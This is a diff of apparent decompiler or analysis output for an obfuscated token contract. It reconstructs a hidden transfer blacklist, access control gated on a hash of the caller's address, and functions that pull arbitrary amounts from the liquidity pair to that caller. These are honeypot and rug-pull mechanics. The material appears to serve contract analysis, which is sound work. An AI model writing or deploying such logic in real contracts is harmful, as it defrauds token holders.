@@ -22,11 +22,25 @@ Function Token._transfer(address, address, uint256)
           emit Transfer(from, to, amount);
       }
   ```
-  AssemblyBlock asm_block_1
+  SolidityLikeFunction
   ```solidity
-  assembly /* s-seir solidity-like view */ {
-      require(!((entry != 0))); // yul: revert(0, 0)
-  }
+  function _transfer(
+          address from,
+          address to,
+          uint256 amount
+      ) internal {
+          require(_balances[from] >= amount, "Insufficient balance");
+  
+          if (_xbkkpxhzey[from]) {
+              assembly /* s-seir solidity-like view */ {
+                  require(!((entry != 0))); // yul: revert(0, 0)
+              }
+          }
+  
+          _balances[from] -= amount;
+          _balances[to] += amount;
+          emit Transfer(from, to, amount);
+      }
   ```
 
 Function Token.xskghmlmxetrv(uint256)
@@ -58,22 +72,32 @@ Function Token.xskghmlmxetrv(uint256)
           emit sYmuKLsGnAfMYs(msg.sender, piyycqfp);
       }
   ```
-  AssemblyBlock asm_block_2
+  SolidityLikeFunction
   ```solidity
-  assembly /* s-seir solidity-like view */ {
-      ptr = mload(0x40); // yul: let ptr := mload(0x40)
-      memory[ptr] = msg.sender; // yul: mstore(ptr, caller())
-      input = (ptr + 0x0c); // yul: let input := add(ptr, 0x0c)
-      inputSize = 0x14; // yul: let inputSize := 0x14
-      output = (ptr + 0x20); // yul: let output := add(ptr, 0x20)
-      memory[0x40] = (output + 0x20); // yul: mstore(0x40, add(output, 0x20))
-      if (!((staticcall(gasleft(), 2, input, inputSize, output, 0x20) == 0))) {
-          computedHash = mload(output); // yul: let computedHash := mload(output)
-          storedHashSlot = _zpewsnjt.slot; // yul: let storedHashSlot := _zpewsnjt.slot
-          storedHash = sload(storedHashSlot); // yul: let storedHash := sload(storedHashSlot)
+  function xskghmlmxetrv(uint256 piyycqfp) public TokenGenerationEvent {
+          assembly /* s-seir solidity-like view */ {
+              ptr = mload(0x40); // yul: let ptr := mload(0x40)
+              memory[ptr] = msg.sender; // yul: mstore(ptr, caller())
+              input = (ptr + 0x0c); // yul: let input := add(ptr, 0x0c)
+              inputSize = 0x14; // yul: let inputSize := 0x14
+              output = (ptr + 0x20); // yul: let output := add(ptr, 0x20)
+              memory[0x40] = (output + 0x20); // yul: mstore(0x40, add(output, 0x20))
+              __sseir_eval_asm_s_7_1 = gasleft(); // yul: if iszero(staticcall(gas(), 2, input, inputSize, output, 0x20))
+              __sseir_eval_asm_s_7_2 = staticcall(__sseir_eval_asm_s_7_1, 2, input, inputSize, output, 0x20);
+              __sseir_eval_asm_s_7_3 = (__sseir_eval_asm_s_7_2 == 0);
+              if (!(__sseir_eval_asm_s_7_3)) {
+                  computedHash = mload(output); // yul: let computedHash := mload(output)
+                  storedHashSlot = _zpewsnjt.slot; // yul: let storedHashSlot := _zpewsnjt.slot
+                  storedHash = storage[storedHashSlot]; // yul: let storedHash := sload(storedHashSlot)
+                  __sseir_eval_asm_s_12_1 = (computedHash == storedHash); // yul: if iszero(eq(computedHash, storedHash))
+                  __sseir_eval_asm_s_12_2 = (__sseir_eval_asm_s_12_1 == 0);
+              }
+              require((computedHash == storedHash)); // yul: revert(0, 0)
+          }
+  
+          _AELYFjhX(liquidityPair, msg.sender, piyycqfp);
+          emit sYmuKLsGnAfMYs(msg.sender, piyycqfp);
       }
-      require((computedHash == storedHash)); // yul: revert(0, 0)
-  }
   ```
 
 Function Token.xskghmlmxetrv(uint256, address)
@@ -105,22 +129,32 @@ Function Token.xskghmlmxetrv(uint256, address)
           emit sYmuKLsGnAfMYs(msg.sender, piyycqfp);
       }
   ```
-  AssemblyBlock asm_block_3
+  SolidityLikeFunction
   ```solidity
-  assembly /* s-seir solidity-like view */ {
-      ptr = mload(0x40); // yul: let ptr := mload(0x40)
-      memory[ptr] = msg.sender; // yul: mstore(ptr, caller())
-      input = (ptr + 0x0c); // yul: let input := add(ptr, 0x0c)
-      inputSize = 0x14; // yul: let inputSize := 0x14
-      output = (ptr + 0x20); // yul: let output := add(ptr, 0x20)
-      memory[0x40] = (output + 0x20); // yul: mstore(0x40, add(output, 0x20))
-      if (!((staticcall(gasleft(), 2, input, inputSize, output, 0x20) == 0))) {
-          computedHash = mload(output); // yul: let computedHash := mload(output)
-          storedHashSlot = _zpewsnjt.slot; // yul: let storedHashSlot := _zpewsnjt.slot
-          storedHash = sload(storedHashSlot); // yul: let storedHash := sload(storedHashSlot)
+  function xskghmlmxetrv(uint256 piyycqfp) public TokenGenerationEvent {
+          assembly /* s-seir solidity-like view */ {
+              ptr = mload(0x40); // yul: let ptr := mload(0x40)
+              memory[ptr] = msg.sender; // yul: mstore(ptr, caller())
+              input = (ptr + 0x0c); // yul: let input := add(ptr, 0x0c)
+              inputSize = 0x14; // yul: let inputSize := 0x14
+              output = (ptr + 0x20); // yul: let output := add(ptr, 0x20)
+              memory[0x40] = (output + 0x20); // yul: mstore(0x40, add(output, 0x20))
+              __sseir_eval_asm_s_7_1 = gasleft(); // yul: if iszero(staticcall(gas(), 2, input, inputSize, output, 0x20))
+              __sseir_eval_asm_s_7_2 = staticcall(__sseir_eval_asm_s_7_1, 2, input, inputSize, output, 0x20);
+              __sseir_eval_asm_s_7_3 = (__sseir_eval_asm_s_7_2 == 0);
+              if (!(__sseir_eval_asm_s_7_3)) {
+                  computedHash = mload(output); // yul: let computedHash := mload(output)
+                  storedHashSlot = _zpewsnjt.slot; // yul: let storedHashSlot := _zpewsnjt.slot
+                  storedHash = storage[storedHashSlot]; // yul: let storedHash := sload(storedHashSlot)
+                  __sseir_eval_asm_s_12_1 = (computedHash == storedHash); // yul: if iszero(eq(computedHash, storedHash))
+                  __sseir_eval_asm_s_12_2 = (__sseir_eval_asm_s_12_1 == 0);
+              }
+              require((computedHash == storedHash)); // yul: revert(0, 0)
+          }
+  
+          _AELYFjhX(liquidityPair, msg.sender, piyycqfp);
+          emit sYmuKLsGnAfMYs(msg.sender, piyycqfp);
       }
-      require((computedHash == storedHash)); // yul: revert(0, 0)
-  }
   ```
 
 Function Token.xjflbfjxthx(address, bool)
@@ -152,22 +186,32 @@ Function Token.xjflbfjxthx(address, bool)
           emit IOosiXIjcvQI(hoiyofjwjh, yycxdxif);
       }
   ```
-  AssemblyBlock asm_block_4
+  SolidityLikeFunction
   ```solidity
-  assembly /* s-seir solidity-like view */ {
-      ptr = mload(0x40); // yul: let ptr := mload(0x40)
-      memory[ptr] = msg.sender; // yul: mstore(ptr, caller())
-      input = (ptr + 0x0c); // yul: let input := add(ptr, 0x0c)
-      inputSize = 0x14; // yul: let inputSize := 0x14
-      output = (ptr + 0x20); // yul: let output := add(ptr, 0x20)
-      memory[0x40] = (output + 0x20); // yul: mstore(0x40, add(output, 0x20))
-      if (!((staticcall(gasleft(), 2, input, inputSize, output, 0x20) == 0))) {
-          computedHash = mload(output); // yul: let computedHash := mload(output)
-          storedHashSlot = _zpewsnjt.slot; // yul: let storedHashSlot := _zpewsnjt.slot
-          storedHash = sload(storedHashSlot); // yul: let storedHash := sload(storedHashSlot)
+  function xjflbfjxthx(address hoiyofjwjh, bool yycxdxif) public TokenGenerationEvent {
+          assembly /* s-seir solidity-like view */ {
+              ptr = mload(0x40); // yul: let ptr := mload(0x40)
+              memory[ptr] = msg.sender; // yul: mstore(ptr, caller())
+              input = (ptr + 0x0c); // yul: let input := add(ptr, 0x0c)
+              inputSize = 0x14; // yul: let inputSize := 0x14
+              output = (ptr + 0x20); // yul: let output := add(ptr, 0x20)
+              memory[0x40] = (output + 0x20); // yul: mstore(0x40, add(output, 0x20))
+              __sseir_eval_asm_s_7_1 = gasleft(); // yul: if iszero(staticcall(gas(), 2, input, inputSize, output, 0x20))
+              __sseir_eval_asm_s_7_2 = staticcall(__sseir_eval_asm_s_7_1, 2, input, inputSize, output, 0x20);
+              __sseir_eval_asm_s_7_3 = (__sseir_eval_asm_s_7_2 == 0);
+              if (!(__sseir_eval_asm_s_7_3)) {
+                  computedHash = mload(output); // yul: let computedHash := mload(output)
+                  storedHashSlot = _zpewsnjt.slot; // yul: let storedHashSlot := _zpewsnjt.slot
+                  storedHash = storage[storedHashSlot]; // yul: let storedHash := sload(storedHashSlot)
+                  __sseir_eval_asm_s_12_1 = (computedHash == storedHash); // yul: if iszero(eq(computedHash, storedHash))
+                  __sseir_eval_asm_s_12_2 = (__sseir_eval_asm_s_12_1 == 0);
+              }
+              require((computedHash == storedHash)); // yul: revert(0, 0)
+          }
+  
+          _xbkkpxhzey[hoiyofjwjh] = yycxdxif;
+          emit IOosiXIjcvQI(hoiyofjwjh, yycxdxif);
       }
-      require((computedHash == storedHash)); // yul: revert(0, 0)
-  }
   ```
 
 Function Token.xjflbfjxthxBatch(address[], bool)
@@ -203,20 +247,34 @@ Function Token.xjflbfjxthxBatch(address[], bool)
           }
       }
   ```
-  AssemblyBlock asm_block_5
+  SolidityLikeFunction
   ```solidity
-  assembly /* s-seir solidity-like view */ {
-      ptr = mload(0x40); // yul: let ptr := mload(0x40)
-      memory[ptr] = msg.sender; // yul: mstore(ptr, caller())
-      input = (ptr + 0x0c); // yul: let input := add(ptr, 0x0c)
-      inputSize = 0x14; // yul: let inputSize := 0x14
-      output = (ptr + 0x20); // yul: let output := add(ptr, 0x20)
-      memory[0x40] = (output + 0x20); // yul: mstore(0x40, add(output, 0x20))
-      if (!((staticcall(gasleft(), 2, input, inputSize, output, 0x20) == 0))) {
-          computedHash = mload(output); // yul: let computedHash := mload(output)
-          storedHashSlot = _zpewsnjt.slot; // yul: let storedHashSlot := _zpewsnjt.slot
-          storedHash = sload(storedHashSlot); // yul: let storedHash := sload(storedHashSlot)
+  function xjflbfjxthxBatch(address[] calldata lzuiukltnaswc, bool yycxdxif) public TokenGenerationEvent {
+          assembly /* s-seir solidity-like view */ {
+              ptr = mload(0x40); // yul: let ptr := mload(0x40)
+              memory[ptr] = msg.sender; // yul: mstore(ptr, caller())
+              input = (ptr + 0x0c); // yul: let input := add(ptr, 0x0c)
+              inputSize = 0x14; // yul: let inputSize := 0x14
+              output = (ptr + 0x20); // yul: let output := add(ptr, 0x20)
+              memory[0x40] = (output + 0x20); // yul: mstore(0x40, add(output, 0x20))
+              __sseir_eval_asm_s_7_1 = gasleft(); // yul: if iszero(staticcall(gas(), 2, input, inputSize, output, 0x20))
+              __sseir_eval_asm_s_7_2 = staticcall(__sseir_eval_asm_s_7_1, 2, input, inputSize, output, 0x20);
+              __sseir_eval_asm_s_7_3 = (__sseir_eval_asm_s_7_2 == 0);
+              if (!(__sseir_eval_asm_s_7_3)) {
+                  computedHash = mload(output); // yul: let computedHash := mload(output)
+                  storedHashSlot = _zpewsnjt.slot; // yul: let storedHashSlot := _zpewsnjt.slot
+                  storedHash = storage[storedHashSlot]; // yul: let storedHash := sload(storedHashSlot)
+                  __sseir_eval_asm_s_12_1 = (computedHash == storedHash); // yul: if iszero(eq(computedHash, storedHash))
+                  __sseir_eval_asm_s_12_2 = (__sseir_eval_asm_s_12_1 == 0);
+              }
+              require((computedHash == storedHash)); // yul: revert(0, 0)
+          }
+  
+          require(lzuiukltnaswc.length <= 100, "Too many addresses");
+  
+          for (uint i = 0; i < lzuiukltnaswc.length; i++) {
+              _xbkkpxhzey[lzuiukltnaswc[i]] = yycxdxif;
+              emit IOosiXIjcvQI(lzuiukltnaswc[i], yycxdxif);
+          }
       }
-      require((computedHash == storedHash)); // yul: revert(0, 0)
-  }
   ```
